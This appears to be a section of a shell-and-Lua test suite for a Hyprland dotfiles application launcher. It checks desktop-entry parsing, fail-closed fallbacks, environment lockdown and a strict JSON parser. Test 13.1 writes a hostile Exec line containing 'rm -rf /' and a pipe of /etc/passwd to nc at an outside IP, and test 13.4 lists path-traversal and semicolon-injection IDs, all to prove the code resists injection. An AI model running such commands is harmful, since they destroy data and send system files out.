section "13. Security Hardening, Platform Launcher Delegation, and Fail-Closed Invariants"

# 13.1: Desktop Entry Exec Shell Injection Immunity
test_13_1_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

local tmp = os.tmpname() .. ".desktop"
local f = io.open(tmp, "w")
f:write("[Desktop Entry]\n")
f:write("Type=Application\n")
f:write("Name=Exploit Test\n")
f:write("Exec=evil_binary $(touch /tmp/pwned_test) ; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 > /dev/null &\n")
f:write("Icon=security-high\n")
f:close()

local parsed = reg.parse_desktop_file(tmp, "exploit.desktop")
os.remove(tmp)

assert(parsed ~= nil, "parse_desktop_file failed")
assert(parsed.command == "gtk-launch -- exploit.desktop", "command mismatch")
assert(#parsed.command_argv == 3, "command_argv length mismatch")
assert(parsed.command_argv[1] == "gtk-launch" and parsed.command_argv[2] == "--" and parsed.command_argv[3] == "exploit.desktop")
assert(not io.open("/tmp/pwned_test", "r"), "Shell injection occurred during parse!")
print("TEST_13_1_OK")
LUA_CHECK
)"
if grep -q "TEST_13_1_OK" <<< "$test_13_1_out"; then
    pass "13.1 desktop entry parsing has zero shell execution and strictly delegates to gtk-launch"
else
    fail "13.1 shell injection immunity test failed: $test_13_1_out"
fi

# 13.2: Missing Default Application Handling & Fail-Closed Policy B
test_13_2_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")
local reg = require("application_registry")
local manifest = require("keybindings_manifest")

-- 1. Test missing configured app with recommended app available (kitty is installed)
local tmp_conf = os.tmpname()
local f = io.open(tmp_conf, "w")
f:write("terminal.default = nonexistent_terminal_xyz\n")
f:close()

reg.get_desktop_config_path = function() return tmp_conf end
reg.invalidate_cache()

local canon, info = reg.resolve_role("terminal")
os.remove(tmp_conf)
assert(canon == "kitty", "Expected fallback to recommended kitty, got: " .. tostring(canon))
assert(info ~= nil and info.desktop_id == "kitty.desktop")

-- 2. Test missing configured app AND missing recommended app (fail closed, no fake record)
reg.find_application = function(id) return nil end
reg.invalidate_cache()

local canon2, info2 = reg.resolve_role("terminal")
assert(canon2 == nil, "Expected nil when all options missing, got: " .. tostring(canon2))
assert(info2 ~= nil and type(info2) == "string", "Expected error message as second return value")

local argv, err = eff.get_action_argv("terminal", manifest)
assert(argv == nil, "get_action_argv should fail closed when role app is unavailable")
assert(err:find("not available"), "Error message mismatch: " .. tostring(err))

local effective = eff.resolve_bindings(manifest, {})
local term_item = nil
for _, b in ipairs(effective.bindings) do
    if b.id == "terminal" then term_item = b break end
end
assert(term_item ~= nil, "terminal binding missing in effective")
assert(term_item.runnable == false, "term_item should be marked unrunnable")
assert(term_item.command == nil, "term_item.command should be nil")
assert(term_item.description:find("%(unavailable%)"), "term_item.description should indicate unavailable")

print("TEST_13_2_OK")
LUA_CHECK
)"
if grep -q "TEST_13_2_OK" <<< "$test_13_2_out"; then
    pass "13.2 Policy B: missing default falls back to Recommended; missing Recommended fails closed without fake synthesis"
else
    fail "13.2 fail-closed Policy B test failed: $test_13_2_out"
fi

# 13.3: Production Environment Override Lockdown
test_13_3_out="$(env -u WORKSTATION_TEST_MODE DEFAULT_TERMINAL=foot TERMINAL=foot DEFAULT_FILE_MANAGER=thunar DEFAULT_BROWSER=firefox "$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")
reg.invalidate_cache()

local canon_term, info_term = reg.resolve_role("terminal")
local canon_fm, info_fm     = reg.resolve_role("file-manager")
local canon_br, info_br     = reg.resolve_role("browser")

assert(canon_term ~= "foot" and info_term.desktop_id ~= "foot.desktop", "DEFAULT_TERMINAL override leaked into production!")
assert(canon_fm ~= "thunar" and info_fm.desktop_id ~= "thunar.desktop", "DEFAULT_FILE_MANAGER override leaked into production!")
assert(canon_br ~= "firefox" and info_br.desktop_id ~= "org.mozilla.firefox.desktop", "DEFAULT_BROWSER override leaked into production!")

print("PROD_LOCKDOWN_OK")
LUA_CHECK
)"
if grep -q "PROD_LOCKDOWN_OK" <<< "$test_13_3_out"; then
    pass "13.3 environment overrides strictly locked down outside WORKSTATION_TEST_MODE=1"
else
    fail "13.3 production environment lockdown failed: $test_13_3_out"
fi

# 13.4: Strict Fail-Closed user_actions.json Parser Negative Test Matrix
test_13_4_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local eff = require("effective_bindings")

local function must_fail(str, desc)
    local res, err = eff.parse_strict_user_actions(str)
    assert(res == nil, "Expected failure for: " .. desc .. ", got success: " .. tostring(res))
    assert(err ~= nil and #err > 0, "Expected error message for: " .. desc)
end

-- 1. Non-object root
must_fail("[]", "array root")
must_fail('"hello"', "string root")
must_fail("123", "number root")
must_fail("true", "boolean root")

-- 2. Missing or invalid version
must_fail('{"actions": []}', "missing version")
must_fail('{"version": 3, "actions": []}', "unsupported version 3")
must_fail('{"version": "1", "actions": []}', "string version")

-- 3. Missing or invalid actions
must_fail('{"version": 1}', "missing actions")
must_fail('{"version": 1, "actions": "app.desktop"}', "string actions")
must_fail('{"version": 1, "actions": 123}', "number actions")

-- 4. Malformed desktop IDs in actions
must_fail('{"version": 1, "actions": ["../evil.desktop"]}', "path traversal ../")
must_fail('{"version": 1, "actions": ["foo/../../bar.desktop"]}', "nested path traversal")
must_fail('{"version": 1, "actions": ["-rf.desktop"]}', "leading dash")
must_fail('{"version": 1, "actions": ["app_without_extension"]}', "missing .desktop")
must_fail('{"version": 1, "actions": ["bad name;.desktop"]}', "semicolon in desktop ID")

-- 5. Trailing garbage
must_fail('{"version": 1, "actions": []} trailing', "trailing garbage")
must_fail('{"version": 1, "actions": []},', "trailing comma")

-- 6. Payload bounding (> 64KB)
local huge_payload = '{"version": 1, "actions": [' .. string.rep('"a.desktop",', 6000) .. '"b.desktop"]}'
assert(#huge_payload > 65536)
must_fail(huge_payload, "oversized payload > 64KB")

-- 7. Valid payload with escapes and UTF-8 (v1 and v2)
local valid_json = '{\n  "version": 1,\n  "actions": [\n    "\\u0061pp.desktop",\n    "second-app.desktop"\n  ]\n}'
local parsed, p_err = eff.parse_strict_user_actions(valid_json)
assert(parsed ~= nil, "Failed to parse valid json: " .. tostring(p_err))
assert(#parsed.actions == 2)
local act1 = parsed.actions[1]
local did1 = (type(act1) == "table") and act1.desktop_id or act1
assert(did1 == "app.desktop", "Escape decoding failed")
local act2 = parsed.actions[2]
local did2 = (type(act2) == "table") and act2.desktop_id or act2
assert(did2 == "second-app.desktop")

local valid_v2 = '{\n  "version": 2,\n  "actions": [\n    {\n      "type": "application",\n      "desktop_id": "org.gnome.Terminal.desktop"\n    },\n    {\n      "type": "executable",\n      "id": "my_script",\n      "name": "My Script",\n      "executable_path": "/usr/bin/true",\n      "argv": ["/usr/bin/true", "--arg"]\n    }\n  ]\n}'
local parsed2, p2_err = eff.parse_strict_user_actions(valid_v2)
assert(parsed2 ~= nil, "Failed to parse valid v2 json: " .. tostring(p2_err))
assert(#parsed2.actions == 2)
assert(parsed2.actions[1].type == "application")
assert(parsed2.actions[1].desktop_id == "org.gnome.Terminal.desktop")
assert(parsed2.actions[2].type == "executable")
assert(parsed2.actions[2].id == "my_script")

-- 8. Deduplication
local dup_json = '{"version": 1, "actions": ["app.desktop", "app.desktop"]}'
local p_dup = eff.parse_strict_user_actions(dup_json)
assert(p_dup ~= nil and #p_dup.actions == 1, "Duplicate action not deduplicated")

print("STRICT_PARSER_OK")
LUA_CHECK
)"
if grep -q "STRICT_PARSER_OK" <<< "$test_13_4_out"; then
    pass "13.4 user_actions.json parser enforces strict fail-closed schema, bounds, and traversal safety"
else
    fail "13.4 strict user_actions parser negative matrix failed: $test_13_4_out"
fi

# 13.5: XDG Desktop Identity, Subdirectory Derivation, and Precedence Masking
test_13_5_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
local root = arg[1]
package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
local reg = require("application_registry")

-- 1. Subdirectory desktop ID derivation
local did1 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/sub/app.desktop")
local did2 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/org/gnome/Software.desktop")
local did3 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/kitty.desktop")
assert(did1 == "sub-app.desktop", "Expected sub-app.desktop, got: " .. tostring(did1))
assert(did2 == "org-gnome-Software.desktop", "Expected org-gnome-Software.desktop, got: " .. tostring(did2))
assert(did3 == "kitty.desktop", "Expected kitty.desktop, got: " .. tostring(did3))

-- 2. TryExec checking
local tmp_try = os.tmpname() .. ".desktop"
local f = io.open(tmp_try, "w")
f:write("[Desktop Entry]\nType=Application\nName=TryExec Test\nExec=try-test\nTryExec=/nonexistent/binary_xyz_123\n")
f:close()
local parsed_te = reg.parse_desktop_file(tmp_try, "try-test.desktop")
os.remove(tmp_try)
assert(parsed_te == nil, "parse_desktop_file should reject non-existent TryExec")

-- 3. Hidden=true masking
local tmp_dir = os.tmpname() .. "_dir"
os.execute("mkdir -p " .. tmp_dir .. "/user/applications " .. tmp_dir .. "/sys/applications")

local f_sys = io.open(tmp_dir .. "/sys/applications/test-masked.desktop", "w")
f_sys:write("[Desktop Entry]\nType=Application\nName=System App\nExec=sys-app\n")
f_sys:close()

local f_user = io.open(tmp_dir .. "/user/applications/test-masked.desktop", "w")
f_user:write("[Desktop Entry]\nType=Application\nName=System App\nHidden=true\n")
f_user:close()

local prev_dirs = reg.get_applications_search_dirs
reg.get_applications_search_dirs = function()
    return { tmp_dir .. "/user/applications", tmp_dir .. "/sys/applications" }
end
reg.invalidate_cache()

local found = reg.find_application("test-masked.desktop")
reg.get_applications_search_dirs = prev_dirs
reg.invalidate_cache()
os.execute("rm -rf " .. tmp_dir)

assert(found == nil, "Hidden=true user entry failed to mask lower-precedence system entry")

print("XDG_IDENTITY_OK")
LUA_CHECK
)"
if grep -q "XDG_IDENTITY_OK" <<< "$test_13_5_out"; then
    pass "13.5 XDG desktop identity: subdirectory derivation, TryExec checking, and Hidden=true masking"
else
    fail "13.5 XDG desktop identity test failed: $test_13_5_out"
fi

# 13.6: Aurelia Keybindings Primary S and U Keys & Search Input Separation
if grep -q 'function focusSearch()' "$qml_header" &&
   grep -q 'eventMatchesShortcut(event, Theme.shortcutSet)' "$qml_window" &&
   grep -q 'eventMatchesShortcut(event, Theme.shortcutUnset)' "$qml_window" &&
   grep -q 'text: Theme.shortcutSet' "$qml_footer" &&
   grep -q 'text: Theme.shortcutUnset' "$qml_footer" &&
   ! grep -q 'text: "Alt+S"' "$qml_header" &&
   ! grep -q 'text: "Alt+U"' "$qml_header"; then
    pass "13.6 KeybindingsWindow uses primary s and u shortcuts with separated search input focus"
else
    fail "13.6 primary s and u shortcut configuration incomplete in KeybindingsWindow"
fi
